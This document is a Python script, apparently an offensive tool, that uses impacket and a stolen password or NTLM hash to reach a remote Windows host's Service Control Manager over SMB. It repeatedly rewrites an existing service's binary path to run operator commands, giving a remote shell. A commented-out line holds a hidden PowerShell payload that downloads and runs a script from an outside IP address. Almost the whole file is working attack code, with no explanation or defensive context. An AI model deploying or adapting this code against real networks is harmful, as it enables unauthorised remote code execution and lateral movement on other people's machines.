from __future__ import division
from __future__ import print_function
import argparse
try:
    import ConfigParser
except ImportError:
    import configparser as ConfigParser
import logging
from threading import Thread
from impacket import version
from impacket.examples import logger
from impacket.dcerpc.v5 import transport, scmr, epm
from impacket.dcerpc.v5.ndr import NULL


class sc:

     def __init__(self, username, password, hashes ,domain, remoteName, servicename,UUID,k, aesKey=None, kdcHost=None):
        self.__username = username
        self.__password = password
        self.__port = 445
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = k
        self.__kdcHost = kdcHost
        self.__remoteName =remoteName
        self.__servicename = servicename
        self.__UUID=UUID
        if hashes is not None:
            print(hashes)
            self.__lmhash, self.__nthash = hashes.split(':')

    #setup the DCERPC connection to SCMR.
    #build the stringbinding.
    # Server is identified as '367ABB81-9844-35F1-AD32-98F038001003':'[MS-SCMR]: Service Control Manager Remote Protocol',
    #SCMR Protocol must use RPC as the transport protocol.
    #Server must use RPC over SMB, ncacn_n or RPC over tcp , or ncacn_ip_tcp.
     def exec(self):

        print("self.__username =", self.__username)
        print("self.__password =", self.__password)
        print("self.__port =", self.__port)
        print("self.__domain =", self.__domain)
        print("self.__lmhash =", self.__lmhash)
        print("self.__nthash =", self.__nthash)
        print("self.__aesKey =", self.__aesKey)
        print("self.__doKerberos =", self.__doKerberos)
        print("self.__kdcHost =", self.__kdcHost)
        print("self.__remoteName =", self.__remoteName)
        print("self.__servicename =", self.__servicename)
        print("self.__UUID =", self.__UUID)

        #We use the SCMR named pipe \pipe\svcctl 
        stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % self.__remoteName
        print(stringbinding)
        #you can use a transportfactory. transport.DCERPCTransportFactory() takes a string binding as an argument and returns an instantiated transport, which uses the correct class for the selected method
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.__port)
        rpctransport.setRemoteHost(self.__remoteName)
      
        #Set credentials
        print("[+] Setting credentials" )
        if hasattr(rpctransport, 'set_credentials'):
            #print("%s %s %s %s " % self.__username,self.__password, self.__domain, self.__nthash)
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)
        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
        #Get the dce_rpc class where we can set authentication levels etc.
  
        rpc= rpctransport.get_dce_rpc()
     
        #Finally, we connect to it.
        print("[+] Trying to authenticate to SMB" )
        try:
            rpc.connect()
        except:
            print("[-] Failed to authenticate")
        rpc.bind(self.__UUID)
      
        #Once authentication is done, we can access the DCE/RPC interface with SC_MANAGER_ALL_ACCESS:
        print("[+] Trying to open ScManager" )
        ans = scmr.hROpenSCManagerW(rpc)
        #acquire handle
        scManagerHandle = ans['lpScHandle']
        
        if (not scManagerHandle):
            print("[-]Failed to acquire service manager handle")
            print(scManagerHandle)
            return 
        
        print("[+] Acquired service manager handle" )

        #Next we will try to open an already existing service:
    
        try:
            print("[+] Trying to acquire %s service handle" % self.__servicename)
            ans = scmr.hROpenServiceW(rpc, scManagerHandle, self.__servicename)
            serviceHandle = ans['lpServiceHandle']
        except:
            print("[-] Couldn't acquire service handle")
        
        print("[+] Acquired %s service handle" % self.__servicename )
        print("[+] Starting shell...")

        user =0 

        while user != "exit":
            pre = "C:\windows\system32\cmd.exe /c "
            user= input("[+]{0}/{1}@{2}> ".format(self.__domain,self.__username,self.__remoteName))

            if user == "exit":
                break
            payload = pre +user
            #Changing config
            try:
                scmr.hRChangeServiceConfigW(rpc, serviceHandle, scmr.SERVICE_NO_CHANGE,scmr.SERVICE_DEMAND_START,scmr.SERVICE_ERROR_IGNORE, payload,NULL, NULL, NULL, NULL, NULL, NULL, NULL)
            except:
                print("[-] Cannot change service config")

            #Start the service to achieve code exec:
            
            try:
                print("[+] Executing command")
                scmr.hRStartServiceW(rpc, serviceHandle)
            except Exception as e:
                if hasattr(e,'ERROR_SERVICE_REQUEST_TIMEOUT'):
                    pass

           
        
        print("[+] Closing service handle")
        scmr.hRCloseServiceHandle(rpc, serviceHandle)




        #specify payload
        #payload = "C:\windows\system32\cmd.exe /c powershell.exe -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://192.168.45.159/test.ps1')"



        #Changing config    
        #scmr.hRChangeServiceConfigW(rpc, serviceHandle, scmr.SERVICE_NO_CHANGE,scmr.SERVICE_DEMAND_START,scmr.SERVICE_ERROR_IGNORE, payload,NULL, NULL, NULL, NULL, NULL, NULL, NULL)
        #print("[+] Changing service config")

        


if __name__ == '__main__':

    parser = argparse.ArgumentParser()

    parser.add_argument('-targetip', action='store', help='target ip')
    parser.add_argument('-domain', action='store', help='Domain')
    parser.add_argument('-username', action='store', help='username')
    parser.add_argument('-password',action='store')
    parser.add_argument('-hash', action='store', help='hash')
    parser.add_argument('-servicename', action='store', help='servicename')
    parser.add_argument('-k', action="store_true", help="Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line")
    parse = parser.parse_args()

    

    out = sc(parse.username,parse.password,parse.hash,parse.domain,parse.targetip,parse.servicename,scmr.MSRPC_UUID_SCMR,parse.k)
    out.exec()